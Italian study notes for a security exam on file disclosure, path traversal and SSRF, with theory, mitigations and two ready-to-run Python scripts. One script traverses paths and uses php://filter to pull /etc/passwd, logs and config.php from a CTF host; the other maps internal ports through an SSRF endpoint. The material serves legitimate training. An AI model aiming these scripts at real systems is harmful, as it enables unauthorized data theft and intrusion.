# Appunti d'Esame: File Disclosure & Server-Side Request Forgery (SSRF)

Questo modulo contiene la teoria fondamentale e gli script Python d'automazione pronti per l'esame sulle vulnerabilità di **File Disclosure**, **Path Traversal** e **Server-Side Request Forgery (SSRF)**. 

Gli appunti seguono la struttura concordata: inquadramento concettuale discorsivo, preambolo sul funzionamento e approfondimento tecnico-operativo, senza riferimenti numerici per una lettura fluida.

---

## Modulo 1: File Disclosure & Path Traversal

### 1. Inquadramento Concettuale e Discorsivo
A livello concettuale, il **File Disclosure** non identifica una singola classe di vulnerabilità, bensì l'**impatto finale** di una serie di debolezze applicative. Consiste nella capacità di un utente malintenzionato di leggere e sottrarre file riservati direttamente dal file system del server.

Le informazioni contenute nei file interni di un server sono di estrema criticità:
* **File caricati dagli utenti:** In molte applicazioni, i dati caricati (es. documenti personali, fatture, referti) sono proprio il patrimonio informativo protetto; il loro leak viola direttamente le politiche di riservatezza.
* **File di configurazione:** File come le configurazioni dei database contengono credenziali di accesso in chiaro. File come `tomcat-users.xml` possono contenere le password dell'amministratore dell'application server, mentre i file di configurazione di Flask o `web.config` di .NET custodiscono i segreti (secret keys) usati per firmare i cookie di sessione. Chi ottiene queste chiavi può falsificare le identità di qualsiasi utente.
* **Codice sorgente:** Per molte aziende, il codice sorgente rappresenta l'asset proprietario principale. Una volta esposto il codice, un attaccante può analizzarlo offline alla ricerca di ulteriori vulnerabilità, specialmente se lo sviluppo ha seguito un modello fallimentare di "security by obscurity".

---

### 2. Preambolo sul Funzionamento (Paths 101)
Per comprendere come avvenga il furto di questi file, occorre fare un passo indietro su come i sistemi operativi gestiscono i percorsi dei file (Paths):
* **Absolute Path (Percorso Assoluto):** Definisce la posizione esatta di un file partendo dalla radice del sistema, indipendentemente dalla directory di lavoro corrente (es. `/etc/passwd` su sistemi Unix o `C:\Windows\win.ini` su Windows).
* **Relative Path (Percorso Relativo):** Descrive la posizione partendo dalla directory di lavoro attuale (es. `foo/bar`).
* **Dirname e Basename:** Un percorso è composto da un *dirname* (la porzione di percorso fino all'ultimo slash `/`) e da un *basename* (la porzione dopo l'ultimo slash). Ad esempio, in `/usr/bin/firefox`, il dirname è `/usr/bin` e il basename è `firefox`.
* **Directory Speciali:** Ogni directory contiene due puntatori speciali: `.` (la directory corrente) e `..` (la directory madre o parent directory).

Il trucco fondamentale risiede nel **processo di normalizzazione dei percorsi**. Un percorso normalizzato è espresso nella sua forma più contratta (es. `/foo/bar`). Se proviamo a richiedere un percorso come `/foo/test/../bar`, la sua forma normalizzata logica è `/foo/bar`. 
Tuttavia, c'è un tranello: se la cartella `/foo/test/` non esiste fisicamente, l'operazione di apertura a livello di sistema operativo fallirà se il sistema cerca di risolvere il percorso non normalizzato riga per riga, poiché non riuscirà ad accedere alla directory inesistente prima di poterne risalire il genitore con `..`. Se invece il percorso viene preventivamente normalizzato via codice prima di essere passato alle funzioni di basso livello, l'apertura avrà successo poiché si tradurrà direttamente nell'apertura di `/foo/bar`.

La vulnerabilità di **Path Traversal** nasce proprio quando un input utente non controllato finisce dentro una funzione di lettura file. Sfruttando la sequenza di risalita `../`, l'attaccante riesce a evadere dalla directory web prestabilita (la "document root") e a navigare all'indietro nell'intero file system.

---

### 3. Approfondimento Tecnico Operativo

#### Sinks Comuni (Funzioni vulnerabili)
Qualsiasi funzione di programmazione che gestisce file può diventare un sink per il File Disclosure se riceve input dell'utente:
* **Funzioni di IO generiche:** `open()` o `fopen()` in qualsiasi linguaggio di programmazione.
* **Funzioni web dedicate:** `send_file()` in Flask (Python).
* **Funzioni di inclusione codice:** Le funzioni di inclusione come `include` o `require` in PHP (che oltre a rivelare il file provano ad eseguirlo).
* **Client HTTP abusati:** Librerie come `cURL` (PHP `curl_init`), nate per effettuare richieste HTTP, possono essere utilizzate per leggere file locali se l'input utente controlla l'intero URL e si dichiara lo schema `file://` (es. `curl_init('file:///etc/passwd')`).

#### Tipologie di Iniezione (Scenari d'Esame)
A seconda di come lo sviluppatore ha concatenato il nostro input, possiamo trovarci di fronte a quattro scenari:
1. **Plain Injection:** `open($input)` – Il massimo controllo. Possiamo inserire percorsi assoluti (es. `/etc/passwd`) o relativi.
2. **Prepended Injection:** `open($input + '/foobar')` – L'input controlla la prima parte del percorso. Possiamo risalire inserendo directory inesistenti o esistenti seguite da `../`.
3. **Appended Injection:** `open('/var/www/uploads/' + $input)` – L'input controlla solo la fine del percorso. È il classico scenario del Path Traversal in cui dobbiamo risalire dalla cartella di upload inserendo ad esempio `../../../../etc/passwd`.
4. **Appended and Prepended:** `open('/var/www/' + $input + '/templates')` – Lo scenario più restrittivo. Dobbiamo iniettare percorsi del tipo `../` per neutralizzare sia l'inizio che la fine, sfruttando cartelle note.

#### Altri Vettori di Leak
Non sempre serve un Path Traversal per ottenere un File Disclosure. A volte i file vengono esposti per errori di configurazione:
* **Directory `.git` esposta:** Se gli sviluppatori caricano l'intera cartella `.git` nella document root del server web, chiunque può scaricarne i file interni (come `.git/logs/HEAD` o l'index) e ricostruire interamente l'albero del codice sorgente dell'applicazione.
* **Server-Side Misrouting:** Configurazioni errate del server web (es. Nginx o Apache) che, a causa di regole di routing mal scritte, restituiscono file sensibili (come file `.php` sorgenti) interpretandoli come file statici o immagini, mostrandoli in chiaro invece di eseguirli.

---

## Modulo 2: Server-Side Request Forgery (SSRF)

### 1. Inquadramento Concettuale e Discorsivo
La vulnerabilità di **Server-Side Request Forgery (SSRF)** consente a un attaccante di costringere l'applicazione web remota a generare ed eseguire richieste di rete per conto suo verso destinazioni arbitrarie.

La gravità di questo attacco risiede nel fatto che il server vulnerabile agisce come un **proxy di fiducia** per conto dell'attaccante. Nella maggior parte delle architetture aziendali, esiste una netta distinzione tra l'ambiente rivolto a internet (protetto da firewall esterni) e l'infrastruttura di rete interna (considerata sicura e spesso priva di autenticazione forte). 
Grazie all'SSRF, l'attaccante abbatte questa barriera difensiva: trovandosi già all'interno del perimetro di rete, la richiesta originata dal server web vulnerabile aggira completamente il firewall esterno. Ciò consente di interagire con pannelli di controllo interni, database, API interne e server di amministrazione che normalmente sarebbero inaccessibili dall'esterno.

Inoltre, se l'applicazione gira su infrastruttura Cloud (come AWS, Google Cloud o Azure), l'impatto si amplifica. Queste istanze possono accedere a indirizzi IP di loopback speciali dedicati alla gestione dei metadati della macchina virtuale. Ad esempio, sulle istanze AWS, l'URL locale `http://169.254.169.254/` contiene informazioni sensibili cruciali, comprese le credenziali IAM (Identity and Access Management) di sicurezza associate all'istanza, che consentirebbero di compromettere l'intero account Cloud.

---

### 2. Preambolo sul Funzionamento (Blind SSRF)
Il funzionamento classico dell'SSRF prevede che l'applicazione accetti un URL fornito dall'utente, effettui la richiesta HTTP e restituisca la risposta a schermo (es. un visualizzatore di anteprime web o un lettore di feed RSS).

Quando l'applicazione effettua la richiesta ma **non restituisce alcuna risposta o contenuto** all'attaccante, si parla di **Blind SSRF**. Sebbene sia meno critica di un'SSRF classica, non va affatto sottovalutata. Un'SSRF cieca permette comunque di:
* **Mappare la rete interna (Port Scanning):** Misurando accuratamente il tempo di risposta del server (Response Time) o osservando i codici di errore HTTP, è possibile determinare se una specifica porta di un indirizzo IP interno è aperta o chiusa.
* **Innescare azioni remote (RCE indiretta):** Molti servizi interni eseguono comandi amministrativi tramite semplici richieste GET (es. API di reset, code di messaggi, database NoSQL come Redis). L'attaccante può inviare payload mirati per forzare il server interno a compiere azioni dannose pur senza poterne leggere la risposta.

---

### 3. Approfondimento Tecnico Operativo

#### Sinks Comuni (Librerie di rete)
Qualsiasi frammento di codice che effettua connessioni esterne è un potenziale punto di iniezione:
* **PHP:** Funzioni che accettano URL come parametri di file (`file_get_contents`, `fopen`), o l'estensione `cURL`.
* **Python:** Librerie come `urllib`, `urllib2`, o il diffuso pacchetto `requests`.
* **Node.js:** `http.request`, `axios`, `fetch`.

#### Come individuare l'SSRF (Fasi d'Esame)
1. **Ricerca degli Endpoint sospetti:** Cercare parametri d'input che accettano palesemente URL o nomi di dominio (es. `?url=`, `?image=`, `?preview=`, `?path=`).
2. **Test di Pingback (OOB - Out of Bound):** Inserire un indirizzo sotto il proprio controllo (es. un server personale o un URL temporaneo di servizi come Webhook.site o ngrok). Se il nostro server registra una richiesta in ingresso proveniente dall'IP del server web della vittima, l'SSRF è confermata.
3. **Esplorazione dell'Ambiente Interno:** Una volta confermato il pingback, si tenta di sostituire il dominio con:
   * Indirizzi di loopback: `localhost`, `127.0.0.1` o `[::]` (IPv6).
   * Range IP privati: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`.
   * Endpoint dei Metadati Cloud: `169.254.169.254` (per AWS/GCP).
4. **Analisi dei Tempi di Risposta (Timing):** Se la connessione verso una porta chiusa (o un IP inesistente) va in timeout dopo 10 secondi, mentre verso una porta aperta risponde istantaneamente, abbiamo un metodo preciso per scansionare l'infrastruttura.

#### Tecniche di Mitigazione
* **Whitelisting (Strategia più efficace):** Consentire le richieste solo verso un elenco ristretto e predefinito di domini attendibili o indirizzi IP sicuri.
* **Isolamento di rete:** Configurare il server web vulnerabile in una zona di rete demilitarizzata (DMZ) o isolarlo tramite regole di firewall interne in modo che non possa comunicare con gli host interni sensibili.

---

## Modulo 3: Script d'Automazione per la tua Chiavetta USB

Di seguito sono riportati i due script Python pronti per l'esame pratico, scritti in modo robusto, commentati e pronti all'uso.

### Script 1: LFI & Path Traversal Fuzzer / Downloader
Questo script permette di testare ed esfiltrare file in modo automatico. Gestisce la risalita delle directory ed è pronto per incorporare i wrapper PHP (es. `php://filter`) se l'esame richiede di leggere file `.php` bypassando l'esecuzione.

```python
#!/usr/bin/env python3
import requests
import sys

# Impostazioni di base - Adatta queste variabili all'ambiente d'esame
TARGET_URL = "http://basiclfi.challs.cyberchallenge.it/index.php" # URL dell'applicazione vulnerabile
PARAMETER_NAME = "page" # Nome del parametro vulnerabile

# Lista di file critici da tentare di esfiltrare
TARGET_FILES = {
    "passwd": "../../../../../../../../etc/passwd",
    "hosts": "../../../../../../../../etc/hosts",
    "apache_log": "../../../../../../../../var/log/apache2/access.log",
    "nginx_log": "../../../../../../../../var/log/nginx/access.log"
}

# Wrapper PHP utili se il target esegue il codice ma vogliamo solo leggerne il sorgente
PHP_WRAPPERS = {
    "base64_filter": "php://filter/convert.base64-encode/resource="
}

def check_lfi(payload):
    """Invia la richiesta e restituisce il contenuto se la risposta è valida"""
    params = {PARAMETER_NAME: payload}
    try:
        response = requests.get(TARGET_URL, params=params, timeout=5)
        # Sostituisci la condizione di successo in base al comportamento dell'applicazione d'esame
        if response.status_code == 200 and len(response.text) > 0:
            return response.text
    except requests.exceptions.RequestException as e:
        print(f"[-] Errore di connessione: {e}")
    return None

def main():
    print("[*] Avvio LFI / Path Traversal Scanner...")
    
    # 1. Test di base per verificare se il server risponde
    test_payload = TARGET_FILES["passwd"]
    content = check_lfi(test_payload)
    if content and "root:" in content:
        print("[+] Vulnerabilità LFI confermata! Rilevato contenuto di /etc/passwd\n")
    else:
        print("[-] Test LFI standard fallito. Provo con altre varianti...")

    # 2. Esfiltrazione automatica dei file definiti
    for name, path in TARGET_FILES.items():
        print(f"[*] Tentativo di recupero file: {name} ({path})")
        res = check_lfi(path)
        if res:
            print(f"[+] File {name} esfiltrato con successo! Anteprima (primi 200 caratteri):")
            print("-" * 50)
            print("\n".join(res.splitlines()[:10]))
            print("-" * 50)
            # Salva il file localmente per analisi offline
            with open(f"exfiltrated_{name}.txt", "w", encoding="utf-8") as f:
                f.write(res)
            print(f"[+] Salvato in local come 'exfiltrated_{name}.txt'\n")
        else:
            print(f"[-] Impossibile recuperare il file: {name}\n")

    # 3. Esempio d'uso dei wrapper PHP per leggere file di codice (es. config.php)
    # Se sai che esiste un file 'config.php', lo richiedi codificato in Base64 per evitare che venga eseguito
    target_php_file = "config.php"
    wrapper_payload = f"{PHP_WRAPPERS['base64_filter']}{target_php_file}"
    print(f"[*] Tentativo di lettura sorgente PHP tramite wrapper su '{target_php_file}'")
    b64_content = check_lfi(wrapper_payload)
    if b64_content:
        import base64
        try:
            decoded = base64.b64decode(b64_content.strip()).decode('utf-8')
            print("[+] Sorgente decodificato con successo! Salvataggio in 'exfiltrated_config.php'")
            with open("exfiltrated_config.php", "w") as f:
                f.write(decoded)
        except Exception as e:
            print(f"[-] Errore nella decodifica Base64. Il file potrebbe contenere HTML spurio. Contenuto grezzo: \n{b64_content}")

if __name__ == "__main__":
    main()
```

### Script 2: SSRF Scanner & Internal Network Mapper
Questo script mappa la rete interna o scansiona le porte del localhost sfruttando l'SSRF. Analizza sia le risposte dirette che la latenza temporale per rilevare porte aperte dietro il firewall.

```python
#!/usr/bin/env python3
import requests
import time
import concurrent.futures

# Impostazioni di base
SSRF_ENDPOINT = "http://ssrf1.challs.cyberchallenge.it/view.php" # URL dell'applicazione vulnerabile
URL_PARAMETER = "url" # Parametro che accetta l'URL da richiedere

# Configurazione del target interno da scansionare
INTERNAL_HOST = "http://127.0.0.1" # o un IP privato come 192.168.1.1
PORTS_TO_SCAN = [22, 80, 443, 3306, 5000, 8000, 8080] # Porte comuni da mappare

def scan_port(port):
    """Invia una richiesta SSRF per testare una specifica porta interna"""
    # Costruiamo l'URL interno, es: http://127.0.0.1:80
    payload = f"{INTERNAL_HOST}:{port}"
    params = {URL_PARAMETER: payload}
    
    start_time = time.time()
    try:
        # Nota: timeout basso per evitare di bloccarsi su porte chiuse che droppano i pacchetti
        response = requests.get(SSRF_ENDPOINT, params=params, timeout=3.0)
        duration = time.time() - start_time
        
        # Criteri di successo d'esame (Adattabili in base alle risposte dell'applicazione)
        # Caso A: Il server restituisce l'output della porta o codice 200
        # Caso B (Blind): La porta è aperta se risponde velocemente, chiusa se va in timeout
        # Adatta questa logica analizzando i comportamenti del target d'esame
        if response.status_code == 200:
            return port, True, duration, f"OK (Status: 200)"
        else:
            return port, True, duration, f"Risposta parziale (Status: {response.status_code})"
            
    except requests.exceptions.Timeout:
        # Se va in timeout, la porta è probabilmente chiusa o filtrata (firewall drop)
        duration = time.time() - start_time
        return port, False, duration, "TIMEOUT"
    except requests.exceptions.RequestException as e:
        # Errori di connessione (Connection Refused o simili)
        duration = time.time() - start_time
        return port, False, duration, f"CONNECTION REFUSED"

def main():
    print(f"[*] Avvio mappatura SSRF su {INTERNAL_HOST}...")
    print(f"[*] Invio richieste tramite l'endpoint: {SSRF_ENDPOINT}\n")
    
    open_ports = []
    
    # Utilizzo di ThreadPoolExecutor per velocizzare la scansione in parallelo
    with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
        results = executor.map(scan_port, PORTS_TO_SCAN)
        
        for port, is_open, duration, msg in results:
            if is_open:
                print(f"[+] PORTA {port:5d} -> APERTA | Tempo: {duration:.2f}s | Risposta: {msg}")
                open_ports.append(port)
            else:
                print(f"[-] PORTA {port:5d} -> CHIUSA  | Tempo: {duration:.2f}s | Risposta: {msg}")
                
    print(f"\n[*] Scansione completata. Porte aperte rilevate: {open_ports}")

if __name__ == "__main__":
    main()
```
